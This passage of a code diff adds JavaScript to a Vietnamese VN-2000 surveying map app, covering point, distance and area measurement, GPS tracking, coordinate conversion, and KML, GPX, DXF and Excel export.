+}
+
+/* ============================================================
+   Rendering
+   ============================================================ */
+function fmtLL(lat,lng){ return `${lat.toFixed(6)}, ${lng.toFixed(6)}`; }
+function fmtEN(e,n){ return `${e.toFixed(3)}  ${n.toFixed(3)}`; }
+function distGrid(a,b){ const p=toEN(a.lat,a.lng), q=toEN(b.lat,b.lng); return Math.hypot(p.e-q.e, p.n-q.n); }
+
+function pName(p,i){ return (p&&p.name)? p.name : 'P'+(i+1); }
+function editPoint(i){
+  const p=data.point[i]; if(!p) return;
+  const nm=prompt('Tên điểm:', pName(p,i));
+  if(nm===null) return;
+  p.name=nm.trim()||('P'+(i+1));
+  const hv=prompt('Cao độ h (m) — để trống nếu chưa có:', p.h!=null? String(p.h):'');
+  if(hv!==null){ const f=parseFloat(String(hv).replace(',','.')); p.h = isNaN(f)? null : f; }
+  renderAll(); toast('Đã cập nhật '+p.name);
+}
+function renderPoints(){
+  gPoint.clearLayers();
+  data.point.forEach((p,i)=>{
+    const cm=L.circleMarker([p.lat,p.lng],{radius:8,color:'#1a1204',weight:2,fillColor:COL.point,fillOpacity:1})
+      .addTo(gPoint).bindTooltip(pName(p,i),{permanent:true,direction:'top',className:'lbl',offset:[0,-6]});
+    cm.on('click',ev=>{ L.DomEvent.stopPropagation(ev); pickPoint(i); });
+  });
+  const wrap = document.getElementById('pt-list');
+  document.getElementById('pt-n').textContent = data.point.length? `(${data.point.length})`:'';
+  if(!data.point.length){ wrap.innerHTML='<div class="empty">Chạm vào bản đồ hoặc nhấn ＋ để thêm điểm.</div>'; }
+  else{
+    wrap.innerHTML='';
+    data.point.forEach((p,i)=>{
+      const en=toEN(p.lat,p.lng);
+      const el=document.createElement('div'); el.className='item';
+      el.innerHTML=`<div class="idx">${i+1}</div>
+        <div class="co"><div class="a">${pName(p,i)} · E ${en.e.toFixed(3)}  N ${en.n.toFixed(3)}</div>
+        <div class="b">${p.lat.toFixed(6)}, ${p.lng.toFixed(6)}${p.h!=null?' · h='+p.h.toFixed(3)+' m':''}</div></div>
+        <button class="x ed" data-i="${i}" title="Sửa tên / cao độ">✎</button>
+        <button class="x" data-i="${i}">×</button>`;
+      el.querySelector('.ed').onclick=()=>editPoint(i);
+      el.querySelectorAll('.x')[1].onclick=()=>{data.point.splice(i,1); renderAll();};
+      wrap.appendChild(el);
+    });
+  }
+  updateCount();
+}
+
+function updatePanelDist(){
+  const arr=data.distance; let total=0;
+  for(let i=1;i<arr.length;i++) total+=distGrid(arr[i-1],arr[i]);
+  const seg=arr.length>=2? distGrid(arr[arr.length-2],arr[arr.length-1]):0;
+  document.getElementById('d-total').textContent=total.toFixed(2);
+  document.getElementById('d-seg').textContent=seg.toFixed(2);
+}
+/* redraw distance line + on-map labels only (safe during live drag) */
+function redrawDistOverlay(){
+  gDistOv.clearLayers();
+  const arr=data.distance;
+  const pts=arr.map(p=>[p.lat,p.lng]);
+  if(pts.length>=2) L.polyline(pts,{color:COL.distance,weight:3,opacity:.95}).addTo(gDistOv);
+  let total=0;
+  for(let i=1;i<arr.length;i++){
+    const d=distGrid(arr[i-1],arr[i]); total+=d;
+    labelAt(midLL(arr[i-1],arr[i]), fmtLen(d), 'seg', gDistOv);
+  }
+  if(arr.length>=2){
+    labelAt([arr[arr.length-1].lat,arr[arr.length-1].lng], 'Σ '+fmtLen(total), 'tot', gDistOv);
+  }
+  return total;
+}
+function renderDist(){
+  gDist.clearLayers();
+  data.distance.forEach((p,i)=>{
+    makeVertex(data.distance,i,COL.distance,gDist,(live)=>{ redrawDistOverlay(); updatePanelDist(); if(!live){ renderAll(); } })
+      .bindTooltip(String(i+1),{permanent:true,direction:'top',className:'lbl',offset:[0,-10]});
+  });
+  const total=redrawDistOverlay();
+  let seg=0; if(data.distance.length>=2) seg=distGrid(data.distance[data.distance.length-2],data.distance[data.distance.length-1]);
+  document.getElementById('d-total').textContent = total.toFixed(2);
+  document.getElementById('d-seg').textContent = seg.toFixed(2);
+  const wrap=document.getElementById('d-list');
+  if(data.distance.length<2){ wrap.innerHTML='<div class="empty">Chạm bản đồ, chạm điểm đã đánh dấu, hoặc bấm nút P bên trên để đặt các đỉnh.</div>'; }
+  else{
+    wrap.innerHTML='';
+    for(let i=1;i<data.distance.length;i++){
+      const d=distGrid(data.distance[i-1],data.distance[i]);
+      const el=document.createElement('div'); el.className='item';
+      el.innerHTML=`<div class="idx" style="background:var(--cyan);color:#04262a">${i}</div>
+        <div class="co"><div class="a">Đoạn ${i}→${i+1}: ${d.toFixed(2)} m</div></div>`;
+      wrap.appendChild(el);
+    }
+  }
+  updateCount();
+}
+
+function polyAreaPerim(pts){
+  if(pts.length<3) return {area:0, perim:0};
+  const en=pts.map(p=>toEN(p.lat,p.lng));
+  let a=0, per=0;
+  for(let i=0;i<en.length;i++){
+    const j=(i+1)%en.length;
+    a += en[i].e*en[j].n - en[j].e*en[i].n;
+    per += Math.hypot(en[i].e-en[j].e, en[i].n-en[j].n);
+  }
+  return {area:Math.abs(a)/2, perim:per};
+}
+function centroidLL(arr){
+  if(!arr.length) return null;
+  let la=0,ln=0; arr.forEach(p=>{la+=p.lat;ln+=p.lng;}); return [la/arr.length, ln/arr.length];
+}
+function updatePanelArea(){
+  const {area,perim}=polyAreaPerim(data.area);
+  let v=area, u='m²';
+  if(area>=1e6){ v=area/1e6; u='km²'; }
+  else if(area>=1e4){ v=area/1e4; u='ha'; }
+  document.getElementById('a-area').textContent = data.area.length>=3? v.toFixed(v<100?3:2):'0';
+  document.getElementById('a-unit').textContent = u + (data.area.length>=3?' · lưới VN2000':'');
+  document.getElementById('a-peri').textContent = perim.toFixed(2);
+  document.getElementById('a-extra').textContent = data.area.length>=3
+    ? `= ${area.toFixed(2)} m² = ${(area/1e4).toFixed(4)} ha = ${(area/1e6).toFixed(6)} km²` : 'Cần tối thiểu 3 đỉnh.';
+}
+/* redraw area polygon + on-map labels only (safe during live drag) */
+function redrawAreaOverlay(){
+  gAreaOv.clearLayers();
+  const arr=data.area;
+  const pts=arr.map(p=>[p.lat,p.lng]);
+  if(pts.length>=3) L.polygon(pts,{color:COL.area,weight:3,fillColor:COL.area,fillOpacity:.18}).addTo(gAreaOv);
+  else if(pts.length===2) L.polyline(pts,{color:COL.area,weight:3,dashArray:'5,5'}).addTo(gAreaOv);
+  if(arr.length>=3){
+    const {area,perim}=polyAreaPerim(arr);
+    labelAt(centroidLL(arr), fmtArea(area)+'<br>chu vi '+fmtLen(perim), 'area', gAreaOv);
+  }
+}
+function renderArea(){
+  gArea.clearLayers();
+  data.area.forEach((p,i)=>{
+    makeVertex(data.area,i,COL.area,gArea,(live)=>{ redrawAreaOverlay(); updatePanelArea(); if(!live){ renderAll(); } })
+      .bindTooltip(String(i+1),{permanent:true,direction:'top',className:'lbl',offset:[0,-10]});
+  });
+  redrawAreaOverlay();
+  updatePanelArea();
+  updateCount();
+}
+
+function renderImport(){
+  gImport.clearLayers();
+  imported.forEach(f=>{
+    const latlngs=f.pts.map(p=>[p.lat,p.lng]);
+    if(f.kind==='point'){
+      const q=f.pts[0];
+      L.circleMarker([q.lat,q.lng],{radius:6,color:'#06301f',weight:2,fillColor:COL.import,fillOpacity:1}).addTo(gImport)
+        .bindTooltip(f.name||'●',{permanent:true,direction:'top',className:'lbl',offset:[0,-6]});
+    } else if(f.kind==='line'){
+      L.polyline(latlngs,{color:COL.import,weight:3,opacity:.95,dashArray:'1,0'}).addTo(gImport);
+      let len=0; for(let i=1;i<f.pts.length;i++) len+=distGrid(f.pts[i-1],f.pts[i]);
+      if(f.pts.length>=2) labelAt(midLL(f.pts[0],f.pts[f.pts.length-1]), (f.name?f.name+' · ':'')+fmtLen(len), 'imp', gImport);
+    } else if(f.kind==='polygon'){
+      L.polygon(latlngs,{color:COL.import,weight:2.5,fillColor:COL.import,fillOpacity:.14}).addTo(gImport);
+      const {area}=polyAreaPerim(f.pts);
+      labelAt(centroidLL(f.pts), (f.name?f.name+'<br>':'')+fmtArea(area), 'imp', gImport);
+    }
+  });
+  const n=imported.length;
+  const st=document.getElementById('import-stat');
+  if(st) st.textContent = n? `${n} đối tượng đã nhập` : '';
+}
+function renderAll(){ renderPoints(); renderDist(); renderArea(); renderImport(); renderPickChips(); if(typeof saveState==='function') saveState(); }
+
+function pickPoint(i){
+  const p=data.point[i]; if(!p) return;
+  if(mode==='distance'){ data.distance.push({lat:p.lat,lng:p.lng,ref:i+1}); renderAll(); toast('Đã thêm '+pName(p,i)+' vào tuyến đo'); }
+  else if(mode==='area'){ data.area.push({lat:p.lat,lng:p.lng,ref:i+1}); renderAll(); toast('Đã thêm '+pName(p,i)+' vào vùng'); }
+  else { editPoint(i); }
+}
+function renderPickChips(){
+  [['d',data.distance],['a',data.area]].forEach(([pref,target])=>{
+    const row=document.getElementById(pref+'-pick'), box=document.getElementById(pref+'-chips');
+    if(!row||!box) return;
+    if(!data.point.length){ row.style.display='none'; box.innerHTML=''; return; }
+    row.style.display=''; box.innerHTML='';
+    data.point.forEach((p,i)=>{
+      const b=document.createElement('button'); b.className='chip'; b.textContent=pName(p,i);
+      b.onclick=()=>{ target.push({lat:p.lat,lng:p.lng,ref:i+1}); renderAll(); toast('Đã thêm '+pName(p,i)); };
+      box.appendChild(b);
+    });
+  });
+}
+function updateCount(){
+  const n={point:data.point.length, distance:data.distance.length, area:data.area.length}[mode];
+  const lbl={point:'điểm', distance:'đỉnh tuyến', area:'đỉnh vùng'}[mode];
+  document.getElementById('grip-count').textContent = `${n} ${lbl}`;
+}
+
+/* ============================================================
+   Interaction
+   ============================================================ */
+function addAt(lat,lng){ data[mode].push({lat,lng}); renderAll(); }
+map.on('click', e=> addAt(e.latlng.lat, e.latlng.lng));
+document.getElementById('fab-add').onclick=()=>{ const c=map.getCenter(); addAt(c.lat,c.lng); toast('Đã thêm điểm tại tâm ngắm'); };
+
+/* live readout at crosshair */
+function updateReadout(){
+  const c=map.getCenter(); const en=toEN(c.lat,c.lng);
+  document.getElementById('ro-ll').textContent = `${c.lat.toFixed(6)}, ${c.lng.toFixed(6)}`;
+  document.getElementById('ro-en').textContent = `E ${en.e.toFixed(2)}  N ${en.n.toFixed(2)}`;
+}
+map.on('move', updateReadout);
+
+/* modes */
+document.getElementById('modes').addEventListener('click',e=>{
+  const b=e.target.closest('button'); if(!b) return;
+  mode=b.dataset.mode;
+  document.querySelectorAll('#modes button').forEach(x=>x.classList.toggle('on',x===b));
+  document.querySelectorAll('.modepane').forEach(p=>p.style.display = p.dataset.pane===mode?'':'none');
+  document.getElementById('grip-lbl').textContent = {point:'Bảng dữ liệu — Điểm',distance:'Đo khoảng cách',area:'Đo diện tích'}[mode];
+  updateCount();   /* không tự mở bảng — thao tác thẳng trên bản đồ, mở bảng khi cần bằng thanh kéo */
+});
+
+/* undo / clear */
+document.getElementById('pt-undo').onclick=()=>{data.point.pop();renderAll();};
+document.getElementById('pt-clear').onclick=()=>{data.point=[];renderAll();};
+document.getElementById('d-undo').onclick=()=>{data.distance.pop();renderAll();};
+document.getElementById('d-clear').onclick=()=>{data.distance=[];renderAll();};
+document.getElementById('a-undo').onclick=()=>{data.area.pop();renderAll();};
+document.getElementById('a-clear').onclick=()=>{data.area=[];renderAll();};
+
+/* ============================================================
+   Geolocation — vị trí đứng ổn định (lọc Kalman 1D, bám liên tục)
+   ============================================================ */
+const gLoc = L.layerGroup().addTo(map);
+const locTrk = { watchId:null, est:null, eacc:99999, marker:null, circle:null, recenter:false, gotGood:false, t0:0 };
+function locStop(){ if(locTrk.watchId!=null){ navigator.geolocation.clearWatch(locTrk.watchId); locTrk.watchId=null; } }
+function locDraw(lat,lng,acc){
+  if(!locTrk.marker){
+    locTrk.circle=L.circle([lat,lng],{radius:acc,color:'#2f81c9',weight:1,fillColor:'#2f81c9',fillOpacity:.12,interactive:false}).addTo(gLoc);
+    locTrk.marker=L.circleMarker([lat,lng],{radius:7,color:'#fff',weight:2,fillColor:'#2f81c9',fillOpacity:1})
+      .addTo(gLoc).bindTooltip('',{permanent:false,direction:'top',className:'lbl',offset:[0,-8]});
+  } else { locTrk.marker.setLatLng([lat,lng]); locTrk.circle.setLatLng([lat,lng]); locTrk.circle.setRadius(acc); }
+  locTrk.marker.setTooltipContent('Vị trí của bạn · ±'+acc.toFixed(0)+' m');
+}
+/* cập nhật nhanh, ưu tiên fix có độ chính xác cao; đứng yên thì giữ ổn định */
+function locApply(lat,lng,acc){
+  if(!locTrk.est){ locTrk.est={lat,lng}; locTrk.eacc=acc; }
+  else{
+    // fix mới tốt hơn (hoặc xấp xỉ) -> bám mạnh; fix xấu hơn nhiều -> nhích nhẹ, giữ độ chính xác tốt
+    const better = acc <= Math.max(locTrk.eacc*1.6, locTrk.eacc+8);
+    const w = better ? 0.7 : 0.12;
+    locTrk.est = { lat: locTrk.est.lat+(lat-locTrk.est.lat)*w, lng: locTrk.est.lng+(lng-locTrk.est.lng)*w };
+    locTrk.eacc = better ? acc : Math.min(locTrk.eacc*1.04, acc);
+  }
+  const shown=Math.max(Math.min(acc, locTrk.eacc), 3);
+  locDraw(locTrk.est.lat, locTrk.est.lng, shown);
+  const goodNow = acc<=20;
+  if(locTrk.recenter){
+    map.setView([locTrk.est.lat,locTrk.est.lng], Math.max(map.getZoom(),17));
+    if(goodNow || (Date.now()-locTrk.t0)>6000) locTrk.recenter=false;   // theo dõi tới khi có fix tốt rồi khóa, tránh giật khi đo
+  }
+  if(goodNow && !locTrk.gotGood){ locTrk.gotGood=true; toast('Đã định vị · ±'+acc.toFixed(0)+' m'); }
+}
+function locStart(recenter){
+  if(!navigator.geolocation){ toast('Trình duyệt không hỗ trợ định vị'); return; }
+  // iOS/Safari chỉ cho phép định vị khi chạy qua HTTPS (secure context). Mở bằng file:// hoặc http:// sẽ bị chặn và báo nhầm là "chưa cấp quyền".
+  if(!window.isSecureContext){ toast('⚠️ Cần chạy qua HTTPS — iPhone chặn GPS khi mở bằng file:// hoặc http://'); return; }
+  if(recenter){ locTrk.recenter=true; locTrk.gotGood=false; locTrk.t0=Date.now(); toast('Đang định vị…'); }
+  // 1) fix tức thời để nhảy tới vị trí ngay (không dùng cache cũ)
+  navigator.geolocation.getCurrentPosition(
+    p=>locApply(p.coords.latitude,p.coords.longitude,Math.max(p.coords.accuracy||30,1)),
+    ()=>{}, { enableHighAccuracy:true, maximumAge:0, timeout:8000 });
+  // 2) theo dõi liên tục để tinh chỉnh chính xác dần
+  if(locTrk.watchId!=null){
+    if(recenter && locTrk.est) map.setView([locTrk.est.lat,locTrk.est.lng], Math.max(map.getZoom(),17));
+    return;
+  }
+  locTrk.watchId=navigator.geolocation.watchPosition(
+    p=>locApply(p.coords.latitude,p.coords.longitude,Math.max(p.coords.accuracy||30,1)),
+    err=>{ toast(!window.isSecureContext?'⚠️ Cần chạy qua HTTPS thì iPhone mới cho phép GPS':(err&&err.code===1?'Bạn chưa cấp quyền vị trí — kiểm tra Cài đặt → Safari → Vị trí':(err&&err.code===3?'GPS chậm — ra chỗ thoáng rồi thử lại':'Không lấy được vị trí GPS'))); },
+    { enableHighAccuracy:true, maximumAge:0, timeout:15000 });
+}
+document.getElementById('fab-loc').onclick=()=>locStart(true);
+
+/* ============================================================
+   Coordinate-system controls
+   ============================================================ */
+function crsHint(){
+  const el=document.getElementById('rb-status'); if(!el) return;
+  const d=Math.trunc(state.lon0), m=Math.round((state.lon0-d)*60);
+  el.innerHTML = `Đang dùng: VN-2000 · KTT <b style="color:#28c0d8">${d}°${String(m).padStart(2,'0')}′</b> (${state.lon0.toFixed(4)}°) · múi <b style="color:#28c0d8">${state.width}°</b> · k=<b style="color:#28c0d8">${state.k}</b>`;
+}
+function applyCRS(){
+  const deg=parseFloat(document.getElementById('rb-deg').value)||0;
+  const min=parseFloat(document.getElementById('rb-min').value)||0;
+  state.lon0 = deg + min/60;
+  const z=document.querySelector('input[name=zone]:checked');
+  state.width = z? parseInt(z.value):3;
+  state.k = state.width===6? 0.9996 : 0.9999;
+  crsHint(); renderAll(); updateReadout();
+}
+function initCRS(){
+  const sel=document.getElementById('rb-prov');
+  const opt=(t,v)=>{const o=document.createElement('option');o.textContent=t;if(v!=null)o.value=v;else o.disabled=true;return o;};
+  sel.appendChild(opt('— Chọn tỉnh/thành —',''));
+  const g34=document.createElement('optgroup'); g34.label='34 tỉnh/TP (từ 01/7/2025)';
+  P34.forEach(([n,d,m])=>{const o=document.createElement('option');o.value=d+'|'+m;o.textContent=`${n}  (${d}°${String(m).padStart(2,'0')}′)`;g34.appendChild(o);});
+  const g63=document.createElement('optgroup'); g63.label='63 tỉnh (trước sáp nhập)';
+  P63.forEach(([n,d,m])=>{const o=document.createElement('option');o.value=d+'|'+m;o.textContent=`${n}  (${d}°${String(m).padStart(2,'0')}′)`;g63.appendChild(o);});
+  sel.appendChild(g34); sel.appendChild(g63);
+  sel.addEventListener('change',e=>{
+    if(!e.target.value) return;
+    const [d,m]=e.target.value.split('|');
+    document.getElementById('rb-deg').value=d; document.getElementById('rb-min').value=m;
+    applyCRS();
+  });
+  document.getElementById('rb-deg').addEventListener('input',applyCRS);
+  document.getElementById('rb-min').addEventListener('input',applyCRS);
+  document.querySelectorAll('input[name=zone]').forEach(r=>r.addEventListener('change',applyCRS));
+  document.getElementById('rb-gear').onclick=()=>{ applyCRS(); toast('Đã áp dụng hệ tọa độ'); };
+  document.getElementById('rb-export').onclick=runExport;
+  document.getElementById('rb-nav').onclick=openNav;
+  document.getElementById('rb-loc').onclick=()=>document.getElementById('fab-loc').click();
+  const info=document.getElementById('rb-info');
+  document.getElementById('rb-tab-info').onclick=()=>info.classList.toggle('show');
+  document.addEventListener('click',e=>{ if(!e.target.closest('#rb-tab-info') && !e.target.closest('#rb-info')) info.classList.remove('show'); });
+  applyCRS();
+}
+function runExport(){
+  const f=(document.querySelector('input[name=fmt]:checked')||{}).value||'kml';
+  if(f==='kml') exportKML(); else if(f==='dxf') exportDXF(); else if(f==='xlsx') exportXLS(); else if(f==='gpx') exportGPX(); else exportIMG();
+}
+
+/* go to coordinate */
+let gotoType='ll';
+document.getElementById('gotoseg').addEventListener('click',e=>{
+  const b=e.target.closest('button'); if(!b) return;
+  gotoType=b.dataset.t;
+  document.querySelectorAll('#gotoseg button').forEach(x=>x.classList.toggle('on',x===b));
+  document.getElementById('goto-in').placeholder = gotoType==='ll'?'10.7769, 106.7009':'603797.77, 1191942.51';
+});
+document.getElementById('goto-btn').onclick=()=>{
+  const raw=document.getElementById('goto-in').value.trim();
+  const m=raw.split(/[,\s]+/).map(Number).filter(x=>!isNaN(x));
+  if(m.length<2){ toast('Nhập 2 giá trị, cách nhau bởi dấu phẩy'); return; }
+  let lat,lng;
+  if(gotoType==='ll'){ lat=m[0]; lng=m[1]; }
+  else{ const ll=toLL(m[0],m[1]); lat=ll.lat; lng=ll.lng; }
+  if(Math.abs(lat)>90||Math.abs(lng)>180){ toast('Tọa độ không hợp lệ'); return; }
+  map.setView([lat,lng],16); addAt(lat,lng); toast('Đã đi tới & thêm điểm');
+};
+
+/* quick KTT → KTT converter */
+let cvLast=null;
+document.getElementById('cv-btn').onclick=()=>{
+  const m=document.getElementById('cv-in').value.trim().split(/[,\s]+/).map(Number).filter(x=>!isNaN(x));
+  if(m.length<2){ toast('Nhập E, N cách nhau bởi dấu phẩy'); return; }
+  const d=parseFloat(document.getElementById('cv-deg').value)||0;
+  const mi=parseFloat(document.getElementById('cv-min').value)||0;
+  const zw=parseInt(document.getElementById('cv-zone').value)||3;
+  const src=vnDef(d+mi/60, zw===6?0.9996:0.9999);
+  try{
+    const ll=proj4(src, WGS84, [m[0], m[1]]);
+    const lat=ll[1], lng=ll[0];
+    if(!isFinite(lat)||!isFinite(lng)||Math.abs(lat)>90||Math.abs(lng)>180) throw 0;
+    const en=toEN(lat,lng);
+    cvLast={lat,lng};
+    const dd=Math.trunc(state.lon0), dm=Math.round((state.lon0-dd)*60);
+    document.getElementById('cv-out').innerHTML=
+      `KTT ${d}°${String(mi).padStart(2,'0')}′ / múi ${zw}° &nbsp;→&nbsp; <b style="color:var(--accent)">KTT ${dd}°${String(dm).padStart(2,'0')}′ / múi ${state.width}°</b><br>`+
+      `E = <b>${en.e.toFixed(3)}</b> &nbsp; N = <b>${en.n.toFixed(3)}</b><br>WGS84: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+    document.getElementById('cv-add').style.display='';
+  }catch(_){ toast('Tọa độ không hợp lệ'); }
+};
+document.getElementById('cv-add').onclick=()=>{
+  if(!cvLast) return;
+  data.point.push({lat:cvLast.lat,lng:cvLast.lng});
+  map.setView([cvLast.lat,cvLast.lng],17); renderAll(); toast('Đã thêm điểm từ kết quả tính chuyển');
+};
+
+/* help modal */
+document.getElementById('rb-tab-help').onclick=()=>document.getElementById('helpModal').classList.add('show');
+document.getElementById('help-close').onclick=()=>document.getElementById('helpModal').classList.remove('show');
+document.getElementById('helpModal').addEventListener('click',e=>{ if(e.target.id==='helpModal') document.getElementById('helpModal').classList.remove('show'); });
+
+/* ============================================================
+   Panel behaviour
+   ============================================================ */
+const panel=document.getElementById('panel');
+function openPanel(v){ panel.classList.toggle('open', v!==undefined? v : !panel.classList.contains('open')); syncPanelH(); }
+document.getElementById('grip').onclick=()=>openPanel();
+function syncPanelH(){
+  const isDesktop = window.matchMedia('(min-width:820px)').matches;
+  const h = (panel.classList.contains('open') && !isDesktop)? panel.getBoundingClientRect().height : 44;
+  document.documentElement.style.setProperty('--panel-h', (isDesktop?0:h)+'px');
+}
+window.addEventListener('resize',syncPanelH);
+function syncRibbonH(){ const rb=document.getElementById('ribbon'); if(rb) document.documentElement.style.setProperty('--rbh', rb.offsetHeight+'px'); }
+window.addEventListener('resize',syncRibbonH);
+window.addEventListener('load',syncRibbonH);
+
+/* ============================================================
+   Toast
+   ============================================================ */
+let toT;
+function toast(msg){ const t=document.getElementById('toast'); t.textContent=msg; t.classList.add('show'); clearTimeout(toT); toT=setTimeout(()=>t.classList.remove('show'),2200); }
+
+/* ============================================================
+   Downloads helper
+   ============================================================ */
+function download(name, content, mime){
+  const blob = content instanceof Blob? content : new Blob([content],{type:mime||'text/plain;charset=utf-8'});
+  const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=name;
+  document.body.appendChild(a); a.click(); setTimeout(()=>{URL.revokeObjectURL(a.href); a.remove();},400);
+}
+function ts(){ const d=new Date(); const p=n=>String(n).padStart(2,'0'); return `${d.getFullYear()}${p(d.getMonth()+1)}${p(d.getDate())}_${p(d.getHours())}${p(d.getMinutes())}`; }
+function hasAny(){ return data.point.length||data.distance.length||data.area.length; }
+
+/* ---------------- KML (WGS84) ---------------- */
+function buildKML(){
+  const esc=s=>String(s).replace(/[<&>]/g,c=>({'<':'&lt;','&':'&amp;','>':'&gt;'}[c]));
+  let s=`<?xml version="1.0" encoding="UTF-8"?>\n<kml xmlns="http://www.opengis.net/kml/2.2"><Document>\n`;
+  s+=`<name>GeoField ${ts()}</name>\n`;
+  s+=`<Style id="pt"><IconStyle><color>ff2010ff</color><scale>1.0</scale></IconStyle></Style>\n`;
+  s+=`<Style id="ln"><LineStyle><color>ffc9c038</color><width>3</width></LineStyle></Style>\n`;
+  s+=`<Style id="pg"><LineStyle><color>ffff8cb5</color><width>3</width></LineStyle><PolyStyle><color>44ff8cb5</color></PolyStyle></Style>\n`;
+  if(data.point.length){
+    s+=`<Folder><name>Điểm</name>\n`;
+    data.point.forEach((p,i)=>{ const en=toEN(p.lat,p.lng);
+      s+=`<Placemark><name>${esc(pName(p,i))}</name><description>E=${en.e.toFixed(3)} N=${en.n.toFixed(3)} (VN2000 KTT ${state.lon0}°/${state.width}°)${p.h!=null?` h=${p.h} m`:''}</description><styleUrl>#pt</styleUrl><Point><coordinates>${p.lng},${p.lat},${p.h!=null?p.h:0}</coordinates></Point></Placemark>\n`; });
+    s+=`</Folder>\n`;
+  }
+  if(data.distance.length>=2){
+    let tot=0; for(let i=1;i<data.distance.length;i++) tot+=distGrid(data.distance[i-1],data.distance[i]);
+    s+=`<Placemark><name>Tuyến đo — ${tot.toFixed(2)} m</name><styleUrl>#ln</styleUrl><LineString><tessellate>1</tessellate><coordinates>`;
+    s+=data.distance.map(p=>`${p.lng},${p.lat},0`).join(' ');
+    s+=`</coordinates></LineString></Placemark>\n`;
+  }
+  if(data.area.length>=3){
+    const {area}=polyAreaPerim(data.area);
+    s+=`<Placemark><name>Vùng — ${(area/1e4).toFixed(4)} ha</name><styleUrl>#pg</styleUrl><Polygon><outerBoundaryIs><LinearRing><coordinates>`;
+    const ring=data.area.concat([data.area[0]]);
+    s+=ring.map(p=>`${p.lng},${p.lat},0`).join(' ');
+    s+=`</coordinates></LinearRing></outerBoundaryIs></Polygon></Placemark>\n`;
+  }
+  s+=`</Document></kml>`;
+  return s;
+}
+const exportKML=()=>{ if(!hasAny())return toast('Chưa có dữ liệu để xuất');
+  download(`geofield_${ts()}.kml`, buildKML(), 'application/vnd.google-earth.kml+xml'); toast('Đã xuất KML'); };
+
+/* ---------------- GPX (WGS84) ---------------- */
+function buildGPX(){
+  const esc=s=>String(s).replace(/[<&>"]/g,c=>({'<':'&lt;','&':'&amp;','>':'&gt;','"':'&quot;'}[c]));
+  let s=`<?xml version="1.0" encoding="UTF-8"?>\n<gpx version="1.1" creator="GeoField VN-2000 PRO" xmlns="http://www.topografix.com/GPX/1/1">\n`;
+  data.point.forEach((p,i)=>{ s+=`<wpt lat="${p.lat.toFixed(8)}" lon="${p.lng.toFixed(8)}">${p.h!=null?`<ele>${p.h}</ele>`:''}<name>${esc(pName(p,i))}</name></wpt>\n`; });
+  const trk=(arr,nm,close)=>{ if(arr.length<2) return;
+    s+=`<trk><name>${esc(nm)}</name><trkseg>`;
+    (close? arr.concat([arr[0]]) : arr).forEach(p=>{ s+=`<trkpt lat="${p.lat.toFixed(8)}" lon="${p.lng.toFixed(8)}"/>`; });
+    s+=`</trkseg></trk>\n`; };
+  trk(data.distance,'Tuyến đo',false);
+  if(data.area.length>=3) trk(data.area,'Vùng đo',true);
+  s+=`</gpx>`; return s;
+}
+const exportGPX=()=>{ if(!hasAny())return toast('Chưa có dữ liệu để xuất');
+  download(`geofield_${ts()}.gpx`, buildGPX(), 'application/gpx+xml'); toast('Đã xuất GPX'); };
+
+/* ---------------- DXF (VN2000 E,N — R12 ASCII) ---------------- */
+function buildDXF(){
+  let allE=[], allN=[];
+  const collect=arr=>arr.forEach(p=>{const en=toEN(p.lat,p.lng); allE.push(en.e); allN.push(en.n);});
+  collect(data.point); collect(data.distance); collect(data.area);
+  const th = allE.length>1 ? Math.max(1.0,(Math.max(...allE)-Math.min(...allE)+Math.max(...allN)-Math.min(...allN))*0.01) : 2.0;
+  let e=[];
+  const P=(g,v)=>{e.push(g); e.push(v);};
+  // header
+  P(0,"SECTION");P(2,"HEADER");P(9,"$ACADVER");P(1,"AC1009");P(9,"$INSUNITS");P(70,6);P(0,"ENDSEC");
+  // tables (layers)
+  P(0,"SECTION");P(2,"TABLES");P(0,"TABLE");P(2,"LAYER");P(70,3);
+  const layer=(n,c)=>{P(0,"LAYER");P(2,n);P(70,0);P(62,c);P(6,"CONTINUOUS");};
+  layer("DIEM",2); layer("KHOANGCACH",4); layer("DIENTICH",6);
+  P(0,"ENDTAB");P(0,"ENDSEC");
+  // entities
+  P(0,"SECTION");P(2,"ENTITIES");
+  const pt=(x,y,lay,z)=>{P(0,"POINT");P(8,lay);P(10,x.toFixed(4));P(20,y.toFixed(4));P(30,(z!=null?z:0).toFixed(4));};
+  const txt=(x,y,lay,str)=>{P(0,"TEXT");P(8,lay);P(10,(x+th*0.4).toFixed(4));P(20,(y+th*0.4).toFixed(4));P(30,"0.0");P(40,th.toFixed(3));P(1,str);};
+  const poly=(arr,lay,closed)=>{
+    P(0,"POLYLINE");P(8,lay);P(66,1);P(70,closed?1:0);
+    arr.forEach(p=>{const en=toEN(p.lat,p.lng);P(0,"VERTEX");P(8,lay);P(10,en.e.toFixed(4));P(20,en.n.toFixed(4));P(30,"0.0");});
+    P(0,"SEQEND");
+  };
+  data.point.forEach((p,i)=>{const en=toEN(p.lat,p.lng); pt(en.e,en.n,"DIEM",p.h); txt(en.e,en.n,"DIEM",pName(p,i)+(p.h!=null?` h=${p.h.toFixed(3)}`:''));});
+  if(data.distance.length>=2) poly(data.distance,"KHOANGCACH",false);
+  if(data.area.length>=3) poly(data.area,"DIENTICH",true);
+  P(0,"ENDSEC");P(0,"EOF");
+  return e.join("\r\n");
+}
+const exportDXF=()=>{ if(!hasAny())return toast('Chưa có dữ liệu để xuất');
+  download(`geofield_VN2000_${state.lon0}_${ts()}.dxf`, buildDXF(), 'application/dxf'); toast('Đã xuất DXF (VN2000)'); };
+
+/* ---------------- Excel ---------------- */
+const exportXLS=()=>{
+  if(!hasAny())return toast('Chưa có dữ liệu để xuất');
+  const wb=XLSX.utils.book_new();
+  const meta=[[`Hệ tọa độ`,`VN-2000`],[`Kinh tuyến trục (°)`,state.lon0],[`Múi chiếu (°)`,state.width],[`Hệ số k`,state.k],[`Thời điểm`,new Date().toLocaleString('vi-VN')]];
+  // points sheet
+  const ph=[["STT","Tên điểm","h (m)","Longitude","Latitude","E (m)","N (m)"]];
+  data.point.forEach((p,i)=>{const en=toEN(p.lat,p.lng); ph.push([i+1,pName(p,i),p.h!=null?+p.h:"",+p.lng.toFixed(7),+p.lat.toFixed(7),+en.e.toFixed(3),+en.n.toFixed(3)]);});
+  const ws1=XLSX.utils.aoa_to_sheet([...meta,[""],...ph]);
+  ws1['!cols']=[{wch:6},{wch:14},{wch:10},{wch:14},{wch:14},{wch:14},{wch:14}];
+  XLSX.utils.book_append_sheet(wb,ws1,"Diem");
+  // distance sheet
+  if(data.distance.length>=1){
